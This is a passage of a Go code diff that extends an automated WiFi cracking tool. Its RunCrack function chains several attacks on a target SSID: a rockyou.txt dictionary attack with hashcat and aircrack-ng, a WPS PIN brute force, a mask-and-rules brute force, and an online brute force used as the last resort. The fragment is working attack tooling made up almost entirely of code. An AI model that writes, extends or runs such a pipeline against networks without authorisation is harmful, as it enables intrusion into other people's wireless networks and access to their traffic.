+		log.Printf("[crack] Step 8: Dictionary attack (rockyou.txt)...")
+		for _, hashFile := range hashFiles {
+			dictResult, _ := CrackWithHashcat(hashFile, wordlist)
+			if dictResult != nil {
+				results = append(results, *dictResult)
+				if dictResult.Success {
 					return results, nil
 				}
 			}
-
-			// Aircrack-ng fallback.
-			aircrackResult, _ := CrackWithAircrack(hsResult.CaptureFile, wordlist)
+			// Also try aircrack-ng as CPU fallback.
+			aircrackResult, _ := CrackWithAircrack(hashFile, wordlist)
 			if aircrackResult != nil {
 				results = append(results, *aircrackResult)
 				if aircrackResult.Success {
@@ -1475,8 +2121,9 @@ func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Resu
 		}
 	}
 
-	// Step 8: WPS PIN brute force (slow, last resort -- 2-10 hours).
+	// Step 9: WPS PIN brute force (slow -- 2-10 hours).
 	if target.WPSEnabled && !target.WPSLocked {
+		log.Printf("[crack] Step 9: WPS PIN brute force...")
 		pinTimeout := timeout * 4
 		if pinTimeout > time.Hour {
 			pinTimeout = time.Hour
@@ -1484,7 +2131,33 @@ func RunCrack(iface, targetSSID, wordlist string, timeout time.Duration) ([]Resu
 		pinResult, _ := CrackWPSPin(*target, iface, pinTimeout)
 		if pinResult != nil {
 			results = append(results, *pinResult)
+			if pinResult.Success {
+				return results, nil
+			}
 		}
+	}
+
+	// Step 10: Smart brute force (stage 5) -- masks + rules, hours.
+	if len(hashFiles) > 0 {
+		log.Printf("[crack] Step 10: Smart brute force (masks + rules)...")
+		for _, hashFile := range hashFiles {
+			bruteTimeout := min(2*time.Hour, timeout)
+			bruteResult, _ := SmartCrack(hashFile, bruteTimeout, false)
+			if bruteResult != nil {
+				results = append(results, *bruteResult)
+				if bruteResult.Success {
+					return results, nil
+				}
+			}
+		}
+	}
+
+	// Step 11: Online brute force (last resort, no monitor mode needed).
+	log.Printf("[crack] Step 11: Online brute force (last resort)...")
+	onlineTimeout := min(1*time.Hour, timeout)
+	onlineResult, _ := OnlineBruteForce(*target, iface, onlineTimeout)
+	if onlineResult != nil {
+		results = append(results, *onlineResult)
 	}
 
 	return results, nil
